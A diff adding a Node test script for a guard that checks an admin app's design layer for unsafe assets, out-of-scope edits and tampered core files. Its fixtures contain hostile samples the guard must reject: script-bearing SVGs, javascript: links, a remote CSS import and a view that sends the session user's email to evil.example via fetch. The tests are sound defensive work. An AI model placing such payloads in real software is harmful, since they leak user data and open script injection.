@@ -1,0 +1,192 @@
+#!/usr/bin/env node
+// Unit-style tests for the design-layer guard (no dependencies). Run: node scripts/test-guard.mjs
+// Proves: each rule fails on a violating fixture, a valid design passes, a diff touching lib/ fails the scope
+// check, the schema validators fall back per entry, and the CLI exit codes (0 ok / 1 violations / 2 usage).
+import { readFileSync, writeFileSync, mkdirSync, mkdtempSync, cpSync, rmSync, existsSync } from "node:fs";
+import { spawnSync, execFileSync } from "node:child_process";
+import { tmpdir } from "node:os";
+import { fileURLToPath } from "node:url";
+import path from "node:path";
+import { scanCode, scanDataJs, scanCss, scanAsset, scopeViolations } from "./lib/design-scan.mjs";
+import { validateCopy, validateRoutes, LIMITS } from "../lib/design-schema.js";
+import { CASES } from "./__fixtures__/cases.mjs";
+
+const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
+const api = Object.fromEntries(Object.entries(JSON.parse(readFileSync(path.join(ROOT, "lib/public-api.json"), "utf8"))).filter(([k]) => k !== "_comment"));
+let pass = 0, fail = 0;
+const ok = (name, cond, extra = "") => { if (cond) { pass++; } else { fail++; console.error(`  FAIL ${name} ${extra}`); } };
+
+// ── 1. rule fixtures ──
+for (const c of CASES) {
+  let found;
+  if (c.kind === "code") found = scanCode(c.src, "design/views/fixture.js", { api, designRelPath: "design/views/fixture.js" });
+  else if (c.kind === "data") found = scanDataJs(c.src, "design/copy.js");
+  else found = scanCss(c.src, "design/theme.css", "design/theme.css");
+  const rules = found.map((x) => x.rule);
+  if (c.expect === null) ok(`valid: ${c.name}`, found.length === 0, JSON.stringify(found));
+  else ok(`violation: ${c.name} -> ${c.expect}`, rules.includes(c.expect), `got ${JSON.stringify(rules)}`);
+}
+
+// ── 2. assets ──
+const png = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(32)]);
+ok("valid png asset", scanAsset(png, "design/assets/logo.png").length === 0);
+ok("valid passive svg", scanAsset(Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><path d="M0 0h8v8z"/></svg>'), "design/assets/mark.svg").length === 0);
+ok("violation: .exe asset", scanAsset(Buffer.from("MZ"), "design/assets/x.exe").some((x) => x.rule === "asset/type"));
+ok("violation: .html asset", scanAsset(Buffer.from("<html>"), "design/assets/x.html").some((x) => x.rule === "asset/type"));
+ok("violation: .js asset", scanAsset(Buffer.from("alert(1)"), "design/assets/x.js").some((x) => x.rule === "asset/type"));
+ok("violation: oversize png", scanAsset(Buffer.concat([png, Buffer.alloc(LIMITS.assetMaxBytes)]), "design/assets/big.png").some((x) => x.rule === "asset/size"));
+ok("violation: png with the wrong magic bytes", scanAsset(Buffer.from("this is not a png at all, just text"), "design/assets/fake.png").some((x) => x.rule === "asset/magic"));
+for (const [name, svg] of [
+  ["script", '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'],
+  ["onload", '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>'],
+  ["foreignObject", '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe/></foreignObject></svg>'],
+  ["external href", '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/p.png"/></svg>'],
+  ["javascript:", '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><text>x</text></a></svg>'],
+  ["entity", '<!DOCTYPE svg [<!ENTITY x "y">]><svg xmlns="http://www.w3.org/2000/svg"/>'],
+  ["css url()", '<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:url(https://evil.example/x)"/></svg>'],
+]) ok(`violation: active svg (${name})`, scanAsset(Buffer.from(svg), "design/assets/bad.svg").some((x) => x.rule === "asset/svg-active"));
+
+// ── 3. scope check ──
+ok("scope: design files pass", scopeViolations(["design/copy.js", "design/views/home.js", "design/assets/logo.png", "design/theme.css"]).length === 0);
+ok("scope: lib/ change fails", scopeViolations(["design/theme.css", "lib/api.js"]).some((x) => x.rule === "scope/outside-design" && x.file === "lib/api.js"));
+for (const p of ["app.js", "index.html", "ui/kit.js", "core/actions.js", "design-defaults/copy.js", "scripts/check-design.mjs", "scripts/core.manifest.json", "e2e/run.mjs", "styles.css", "config.js", "../outside.txt", "design/../lib/api.js", "/etc/passwd", "designs/x.css", "DESIGN/x.css"]) {
+  ok(`scope: ${p} fails`, scopeViolations([p]).length === 1);
+}
+ok("scope: windows separators are normalised", scopeViolations(["design\\views\\home.js"]).length === 0 && scopeViolations(["lib\\api.js"]).length === 1);
+
+// ── 4. schema fallbacks (the loader and the guard share this code) ──
+{
+  const defaults = { "a.b": "hello {name}", "c.d": "plain" };
+  const r = validateCopy({ "a.b": "hi {name}!", "c.d": 5, "x.y": "unknown", "a b": "bad key", "e": "x" }, defaults);
+  ok("copy: a valid entry is kept", r.copy["a.b"] === "hi {name}!");
+  ok("copy: wrong type, unknown and malformed keys are dropped with warnings", !("c.d" in r.copy) && !("x.y" in r.copy) && r.warnings.length === 4, JSON.stringify(r.warnings));
+  ok("copy: a string over the cap is dropped", !("a.b" in validateCopy({ "a.b": "x".repeat(LIMITS.copyValueMax + 1) }, defaults).copy));
+  ok("copy: an invented placeholder is dropped", !("a.b" in validateCopy({ "a.b": "hi {secret}" }, defaults).copy));
+  ok("copy: not an object falls back entirely", Object.keys(validateCopy("nope", defaults).copy).length === 0);
+  const rr = validateRoutes({ home: "views/home.js", nope: "views/x.js", orders: "../lib/api.js", team: "views/../x.js", shipping: 5, reports: "https://x/y.js" });
+  ok("routes: only a known id with a views/ path is kept", Object.keys(rr.routes).join() === "home" && rr.warnings.length === 5, JSON.stringify(rr));
+}
+
+// ── 5. the CLI on temporary checkouts ──
+const CLI = (root, ...args) => spawnSync(process.execPath, [path.join(root, "scripts/check-design.mjs"), "--root", root, ...args], { encoding: "utf8" });
+function checkout() {
+  const dir = mkdtempSync(path.join(tmpdir(), "admin-guard-"));
+  cpSync(ROOT, dir, { recursive: true, filter: (src) => !/[\\/](\.git|e2e|node_modules)([\\/]|$)/.test(src) && !/config\.local\.js$/.test(src) });
+  return dir;
+}
+const write = (root, rel, text) => { mkdirSync(path.dirname(path.join(root, rel)), { recursive: true }); writeFileSync(path.join(root, rel), text); };
+const git = (root, ...a) => execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", ...a], { cwd: root, stdio: "pipe", encoding: "utf8" });
+
+{
+  const real = spawnSync(process.execPath, [path.join(ROOT, "scripts/check-design.mjs")], { encoding: "utf8" });
+  ok("the shipped repo passes the guard (exit 0)", real.status === 0, real.stdout + real.stderr);
+}
+{
+  const dir = checkout();
+  try {
+    let r = CLI(dir);
+    ok("fresh checkout: exit 0", r.status === 0, r.stderr);
+
+    r = CLI(dir, "--files", "design/theme.css", "lib/api.js");
+    ok("--files with a lib/ path: exit 1 + scope rule", r.status === 1 && /scope\/outside-design/.test(r.stderr), r.stderr);
+    r = CLI(dir, "--files", "design/theme.css", "design/views/home.js");
+    ok("--files design-only: exit 0", r.status === 0, r.stderr);
+
+    // hostile view registered in routes.js
+    write(dir, "design/views/evil.js", `export default function view(root, ctx) { fetch("https://evil.example/?d=" + ctx.session.userEmail); }`);
+    write(dir, "design/routes.js", readFileSync(path.join(dir, "design/routes.js"), "utf8").replace('home: "views/home.js"', 'home: "views/evil.js"'));
+    r = CLI(dir);
+    ok("a view that calls fetch: exit 1 + forbidden-identifier", r.status === 1 && /js\/forbidden-identifier/.test(r.stderr), r.stderr);
+    rmSync(path.join(dir, "design/views/evil.js"));
+    r = CLI(dir);
+    ok("routes.js pointing at a missing file: exit 1", r.status === 1 && /does not exist/.test(r.stderr), r.stderr);
+    write(dir, "design/routes.js", readFileSync(path.join(ROOT, "design/routes.js"), "utf8"));
+    ok("restored: exit 0", CLI(dir).status === 0);
+
+    // copy.js problems
+    const copy = readFileSync(path.join(ROOT, "design/copy.js"), "utf8");
+    write(dir, "design/copy.js", copy.replace('"nav.orders": "訂單"', '"nav.orders": "訂單", "nav.invented": "x"'));
+    r = CLI(dir);
+    ok("copy.js with an unknown key: exit 1", r.status === 1 && /schema\/copy/.test(r.stderr) && /nav\.invented/.test(r.stderr), r.stderr);
+    write(dir, "design/copy.js", copy.replace('"nav.orders": "訂單"', `"nav.orders": "${"長".repeat(700)}"`));
+    r = CLI(dir);
+    ok("copy.js with an over-long string: exit 1", r.status === 1 && /longer than/.test(r.stderr), r.stderr);
+    write(dir, "design/copy.js", copy.replace('"home.greeting": "你好，{shop}"', '"home.greeting": "你好，{shop} {token}"'));
+    r = CLI(dir);
+    ok("copy.js inventing a placeholder: exit 1", r.status === 1 && /placeholder/.test(r.stderr), r.stderr);
+    write(dir, "design/copy.js", copy.replace('"nav.orders": "訂單"', '"nav.orders": String(1)'));
+    r = CLI(dir);
+    ok("copy.js with a call: exit 1 (data file must be pure)", r.status === 1 && /js\/data-not-pure/.test(r.stderr), r.stderr);
+    write(dir, "design/copy.js", copy);
+
+    // theme / assets
+    write(dir, "design/theme.css", `@import url(https://evil.example/x.css);`);
+    r = CLI(dir);
+    ok("theme.css with a remote @import: exit 1", r.status === 1 && /css\/import/.test(r.stderr), r.stderr);
+    write(dir, "design/theme.css", "");
+    write(dir, "design/assets/payload.html", "<script>alert(1)</script>");
+    r = CLI(dir);
+    ok("an .html file in assets: exit 1", r.status === 1 && /asset\/type/.test(r.stderr), r.stderr);
+    rmSync(path.join(dir, "design/assets/payload.html"));
+    write(dir, "design/views/notes.json", "{}");
+    r = CLI(dir);
+    ok("a stray .json under design/: exit 1", r.status === 1 && /files\/type/.test(r.stderr), r.stderr);
+    rmSync(path.join(dir, "design/views/notes.json"));
+    write(dir, "design/extra.js", "export default {};");
+    r = CLI(dir);
+    ok("a stray .js directly in design/: exit 1", r.status === 1 && /files\/location/.test(r.stderr), r.stderr);
+    rmSync(path.join(dir, "design/extra.js"));
+    ok("clean again: exit 0", CLI(dir).status === 0);
+
+    // locked core
+    const api0 = readFileSync(path.join(dir, "lib/api.js"), "utf8");
+    write(dir, "lib/api.js", api0 + "\n// tampered\n");
+    r = CLI(dir);
+    ok("a locked core file changed: exit 1 + manifest rule", r.status === 1 && /manifest\/changed/.test(r.stderr) && /lib\/api\.js/.test(r.stderr), r.stderr);
+    write(dir, "lib/api.js", api0.replace(/\r\n/g, "\n").replace(/\n/g, "\r\n"));
+    ok("CRLF line endings hash the same as LF", CLI(dir).status === 0);
+    write(dir, "lib/api.js", api0 + "\n// intentional\n");
+    ok("--update accepts an intentional core change", CLI(dir, "--update").status === 0 && CLI(dir).status === 0);
+    write(dir, "design-defaults/views/home.js", readFileSync(path.join(dir, "design-defaults/views/home.js"), "utf8") + "\n// tampered default view\n");
+    r = CLI(dir);
+    ok("the pristine default views are locked too", r.status === 1 && /design-defaults\/views\/home\.js/.test(r.stderr), r.stderr);
+
+    // public-api manifest
+    const pa = JSON.parse(readFileSync(path.join(ROOT, "lib/public-api.json"), "utf8"));
+    write(dir, "design-defaults/views/home.js", readFileSync(path.join(ROOT, "design-defaults/views/home.js"), "utf8"));
+    pa["ctx.ui"].push("wipeEverything");
+    write(dir, "lib/public-api.json", JSON.stringify(pa));
+    r = CLI(dir, "--no-layers");
+    ok("public-api.json listing a function that does not exist: exit 1", r.status === 1 && /ctx\/manifest/.test(r.stderr) && /wipeEverything/.test(r.stderr), r.stderr);
+
+    r = CLI(dir, "--base", "no-such-ref-xyz");
+    ok("unreadable --base: exit 2", r.status === 2, `${r.status} ${r.stderr}`);
+    r = spawnSync(process.execPath, [path.join(ROOT, "scripts/check-design.mjs"), "--root", path.join(dir, "nowhere")], { encoding: "utf8" });
+    ok("unreadable --root: exit 2", r.status === 2, `${r.status} ${r.stderr}`);
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+}
+{
+  // --base against a real git history: only design/** may have changed
+  const dir = checkout();
+  try {
+    git(dir, "init", "-q"); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "base");
+    write(dir, "design/theme.css", ".card { border-radius: 4px; }\n");
+    write(dir, "design/assets/mark.svg", '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><path d="M0 0h8v8z"/></svg>');
+    let r = CLI(dir, "--base", "HEAD");
+    ok("--base HEAD with a design-only diff (incl. an untracked file): exit 0", r.status === 0, r.stderr);
+    write(dir, "lib/perm.js", readFileSync(path.join(dir, "lib/perm.js"), "utf8") + "\n// let everyone in\n");
+    r = CLI(dir, "--base", "HEAD", "--no-layers");
+    ok("--base HEAD with a lib/ change: exit 1 + scope rule", r.status === 1 && /scope\/outside-design/.test(r.stderr) && /lib\/perm\.js/.test(r.stderr), r.stderr);
+    git(dir, "checkout", "-q", "--", "lib/perm.js");
+    write(dir, "docs-sneaky.md", "x");
+    r = CLI(dir, "--base", "HEAD", "--no-layers");
+    ok("--base HEAD with a new file outside design/: exit 1", r.status === 1 && /docs-sneaky\.md/.test(r.stderr), r.stderr);
+    rmSync(path.join(dir, "docs-sneaky.md"));
+    git(dir, "mv", "lib/perm.js", "lib/perm2.js");
+    r = CLI(dir, "--base", "HEAD", "--no-layers");
+    ok("--base HEAD with a renamed core file: exit 1 (both names seen)", r.status === 1 && /lib\/perm\.js/.test(r.stderr), r.stderr);
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+}
+
+console.log(`\n${pass} passed, ${fail} failed`);
+process.exit(fail ? 1 : 0);
